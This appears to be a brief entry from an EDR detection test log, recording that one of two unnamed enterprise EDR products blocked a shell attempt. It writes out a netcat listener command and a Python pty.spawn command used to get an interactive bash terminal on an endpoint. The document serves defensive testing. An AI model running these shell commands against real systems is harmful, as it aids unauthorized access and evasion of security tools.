**Detections**
* Enterprise EDR Solution 1: No
* Enterprise EDR Solution 2: Yes (Blocked)

Attempted a shell using the python PTY module which lets you spawn a psuedo-terminal that can fool commands like su into thinking they are being executed in a proper terminal.

Ran the following on my VM 

`nc -lvp 1234`

Ran the following on our endpoint

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

